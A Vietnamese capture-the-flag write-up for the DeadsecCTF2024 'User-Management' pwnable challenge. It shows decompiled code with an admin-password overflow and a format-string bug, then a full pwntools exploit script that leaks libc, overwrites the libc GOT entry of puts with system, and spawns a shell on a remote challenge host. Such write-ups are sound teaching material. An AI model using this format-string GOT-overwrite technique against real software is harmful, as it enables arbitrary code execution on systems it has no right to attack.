# User-Management

> DeadsecCTF2024 pwnable challenge

## 0. Bugs Explorer

- Chương trình file ELF 64-bit khi chạy cung cấp các option sau:

```bash
1. Admin login
2. Create user
3. Login as user
4. Logout
5. View description
6. Exit
Enter choice:
```

- Tương tác với các option liên quan đến 1 cấu struct user như sau:

```c
printf("Enter username: ");
fgets(&vn_buffer_5060[365 * vn_cntUser_533C], 30, stdin);
printf("Enter password: ");
fgets(&vn_buffer_5060[365 * vn_cntUser_533C + 30], 30, stdin);
printf("Enter description: ");
fgets(&vn_buffer_5060[365 * vn_cntUser_533C + 60], 305, stdin);
```

- Bug thứ nhất: Option `1. Admin login` có lỗi tràn bộ đệm từ description của admin vào password của admin giúp bạn thiết lập lại mật khẩu của admin, việc này giúp đăng nhập tài khoản admin và tạo user.

```c
.bss:0000000000005340 ; char vn_doing1[16]
.bss:0000000000005340 vn_doing1       db 10h dup(?)           ; DATA XREF: fn_loginAdmin_1659+5E↑o
.bss:0000000000005340                                         ; fn_loginAdmin_1659+7C↑o
.bss:0000000000005350 ; char vn_passwdAdmin_5350[8]
.bss:0000000000005350 vn_passwdAdmin_5350 db 8 dup(?)         ; DATA XREF: fn_loginAdmin_1659+2C↑o
.bss:0000000000005350                                         ; fn_loginAdmin_1659+F5↑o
.bss:0000000000005358 ; char vn_userAdmin_5358[8]
.bss:0000000000005358 vn_userAdmin_5358 db 8 dup(?)
...
for ( i = 0; i <= 7; ++i )
vn_passwdAdmin_5350[i] = rand();
puts("what do you want to do here?");
fgets(vn_doing1, 21, stdin);                  // ; char vn_doing1[16]
                                            // bypass random pasword admin
if ( !strncmp(vn_doing1, "manage users", 12uLL) )
{
printf("Enter username: ");
__isoc99_scanf("%19s", vn_username);
printf("Enter password: ");
__isoc99_scanf("%19s", vn_passwd);
if ( !strcmp(vn_passwd, vn_passwdAdmin_5350) && !strcmp(vn_username, vn_userAdmin_5358) )//
                                            // bypass passwd = null
{
    vn_statusLogin_5010 = -1;
    printf("\x1B[1;32m");
    puts("Logged in as admin");
    printf("\x1B[0m");
}
```

- Bugs thứ hai: Option `5. View description` có lỗi `format strings` với tên người dùng và mô tả của người dùng đó, đặc biệt với mô tả người dùng còn bị filter ký tự `"$"` còn user thì không ta có thể lợi dụng điều này.

```c
  if ( (unsigned int)vn_statusLogin_5010 < 0xFFFFFFFE )
  {
    qmemcpy(s, &vn_buffer_5060[365 * vn_statusLogin_5010 + 60], 305uLL);
    if ( strchr(s, '$') )
    {
      puts("fr!? what is this description dude??");
    }
    else
    {
      printf("The description for: ");
      printf(&vn_buffer_5060[365 * vn_statusLogin_5010]);
      printf(" is: ");
      printf(s);
      putchar(10);
    }
  }
```

## 1. Solutions Exploit

- Bugs format strings có thể giúp leak dữ liệu và ghi dữ liệu tùy ý vào bất cứ đâu, do mô tả người dùng bị filter ký tự `"$"` nên mình dùng mô tả làm nơi chứa địa chỉ cần ghi đè giá trị lên, đối với tên người dùng sẽ chứa payload trigger bug format strings.

- Vấn đề bây giờ là ghi vào đâu khi file này full các mitigation elf. Ý tưởng ở đây là thực hiện ghi đè `*ABS*.got` của hàm puts (đây là khái niệm về GOT của LIBC không phải GOT của file ELF) thành hàm system. Khi đó username = `"/bin/sh\x00"` và puts(username) = system(username).

```python
#!/usr/bin/env python3
import sys
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
ROP_LOAD = ROP("./libc.so.6")
context.update(binary=elf, log_level="DEBUG")

if args.LOCAL:
    p = elf.process()
elif args.GDB:
    p = gdb.debug([elf.path], '''
            breakrva 0x0000000000001E3B
            breakrva 0x0000000000001E63
        ''')
        #        breakrva 0x0000000000001F78
        #    breakrva 0x0000000000001F87
        #    breakrva 0x0000000000001F96
        #    breakrva 0x0000000000002032
        # fn_loginAdmin_1659();
        # fn_createUser_1848();
        # fn_loginUser_1B0B();
        # fn_viewDescription_1D00();

        # fn_viewDescription_1D00(); printf
else:
    p = remote("35.225.65.217", "30911")

def loginAdmin():
    p.sendlineafter(b"choice: ", b"1")
    p.sendlineafter(b"here?\n", b"manage users" + b"\x00" * 3 + b"A" * 5)
    p.sendlineafter(b"username: ", b"MrAlphaQ")
    p.sendlineafter(b"password: ", b"A" * 4)
    return

def createUser(username, passwd, des):
    p.sendlineafter(b"choice: ", b"2")
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", passwd)
    p.sendlineafter(b"description: ", des)
    return

def loginUser(username, passwd):
    p.sendlineafter(b"choice: ", b"3")
    p.sendlineafter(b"username: ", username)
    p.sendlineafter(b"password: ", passwd)
    return

def logout():
    p.sendlineafter(b"choice: ", b"4")
    return

def viewDescription():
    p.sendlineafter(b"choice: ", b"5")
    return

######### leak
loginAdmin()
# ret = 47 - rsp = 46
createUser(b"/bin/sh\x00", b"a", b"%p_" * 47)
logout()
loginUser(b"/bin/sh\x00", b"a")
viewDescription()
p.recvuntil(b"_")
p.recvuntil(b"_")
libc.address = int(p.recvuntil(b"_").strip(b"_"), 16) - 0x114887
libc_got = libc.address + 0x21a098
system = libc.symbols["system"]
log.info(f"libc base: {hex(libc.address)}")
log.info(f"system   : {hex(system)}")
log.info(f"libc got : {hex(libc_got)}")
for i in range(42):
    p.recvuntil(b"_")
ret_addr = int(p.recvuntil(b"_").strip(b"_"), 16) + 0x8
log.info(f"ret addr : {hex(ret_addr)}")
logout()

######### overwrite
loginAdmin()
payload = f"%{system & 0xffff}c%6$hn".encode()
payload += f"%{((system >> 16) & 0xffff) - (system & 0xffff) + 0x10000}c%7$hn".encode()
createUser(payload, b"b", p64(libc_got) + p64(libc_got + 2) + b"A" * 0x180)
logout()
loginUser(payload, b"b")
viewDescription()
logout()


######### get shell
loginUser(b"/bin/sh\x00", b"a")
viewDescription()

p.interactive()
```

## 2. References

- ...
